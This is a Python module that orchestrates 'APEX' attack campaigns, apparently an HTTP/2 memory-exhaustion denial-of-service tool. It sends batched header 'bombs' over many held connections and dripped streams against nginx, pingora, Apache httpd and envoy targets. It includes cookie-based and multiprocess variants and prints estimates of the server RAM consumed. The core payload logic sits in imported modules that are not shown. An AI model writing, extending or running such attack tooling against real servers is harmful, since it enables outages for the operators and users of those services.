"""APEX v2 campaign modes."""
from __future__ import annotations

from attack_config import (
    AttackConfig,
    profile_apex,
    profile_apex_cookie_envoy,
    profile_apex_cookie_httpd,
    profile_apex_cookie_scaled,
    profile_apex_pingora,
    profile_apex_scaled,
)
from attack_runner import run_attack, run_cookie_attack
from models import RunResult
from paths import DEFAULT_PORT
from variants import get_variant

from .multiprocess import run_cookie_multiprocess, run_multiprocess


def run_apex(
    host: str,
    connections: int = 55,
    port: int = DEFAULT_PORT,
    variant: str = "nginx",
) -> RunResult:
    """Apex: 64×2 waves, batched bombs, respects nginx 128-stream limit."""
    if variant == "pingora":
        cfg = profile_apex_pingora()
    else:
        cfg = profile_apex()
    print(f"=== APEX MODE ({variant}) ===")
    print(f"Config: {cfg.to_extra()}")
    print(f"Est. wire: {cfg.wire_bytes_per_conn() * connections / 1024 / 1024:.0f} MB")
    print(f"Est. server RAM: {cfg.est_server_mb_per_conn() * connections:.0f} MiB\n")
    return run_attack("apex", host, port, connections, cfg=cfg, variant=variant)


def run_apex_scaled(
    host: str,
    connections: int = 100,
    port: int = DEFAULT_PORT,
    variant: str = "nginx",
) -> RunResult:
    """Scale to N conn with ~2 MB wire each — batched parallel, 128 streams/conn."""
    cfg = profile_apex_scaled(connections)
    print(f"=== APEX SCALED ({variant}, {connections} conn) ===")
    print(f"Config: {cfg.to_extra()}")
    print(f"Est. wire: {cfg.wire_bytes_per_conn() * connections / 1024 / 1024:.0f} MB")
    print(f"Est. server RAM: {cfg.est_server_mb_per_conn() * connections:.0f} MiB\n")
    return run_attack("apex_scaled", host, port, connections, cfg=cfg, variant=variant)


def run_apex_multiprocess(
    host: str,
    connections: int = 100,
    port: int = DEFAULT_PORT,
    variant: str = "nginx",
) -> RunResult:
    """One process per connection — bypasses thread/GIL write contention."""
    cfg = profile_apex_scaled(connections)
    cfg = AttackConfig(
        streams=cfg.streams,
        headers=cfg.headers,
        hold=cfg.hold,
        drip=cfg.drip,
        hold_mode=cfg.hold_mode,
        waves_per_conn=1,
        bomb_mode="sequential",
    )
    print(f"=== APEX MULTIPROCESS ({variant}) ===")
    print(f"Config: {cfg.to_extra()}\n")
    return run_multiprocess(
        host, connections, hold=cfg.hold, stagger=0.25, cfg=cfg, port=port,
        strategy=f"apex_mp_{connections}", variant=variant,
    )


def run_apex_cookie(
    host: str,
    connections: int = 44,
    port: int = 10080,
    variant: str = "httpd",
) -> RunResult:
    cfg = profile_apex_cookie_httpd() if variant == "httpd" else profile_apex_cookie_envoy()
    print(f"=== APEX COOKIE ({variant}) ===")
    print(f"Config: {cfg.to_extra()}\n")
    return run_cookie_attack(f"apex_cookie_{variant}", host, port, connections, cfg, variant_id=variant)


def run_apex_cookie_scaled(
    host: str,
    connections: int = 44,
    port: int | None = None,
    variant: str = "httpd",
) -> RunResult:
    spec = get_variant(variant)
    port = port or spec.default_port
    cfg = profile_apex_cookie_scaled(variant, connections)
    print(f"=== APEX COOKIE SCALED ({variant}, {connections} conn) ===")
    print(f"Config: {cfg.to_extra()}\n")
    return run_cookie_attack(
        f"apex_cookie_scaled_{variant}", host, port, connections, cfg, variant_id=variant
    )


def run_apex_cookie_multiprocess(
    host: str,
    connections: int = 44,
    port: int | None = None,
    variant: str = "httpd",
) -> RunResult:
    spec = get_variant(variant)
    port = port or spec.default_port
    cfg = profile_apex_cookie_scaled(variant, connections)
    print(f"=== APEX COOKIE MP ({variant}) ===\n")
    return run_cookie_multiprocess(
        host, connections, port, cfg, variant, strategy=f"apex_cookie_mp_{connections}"
    )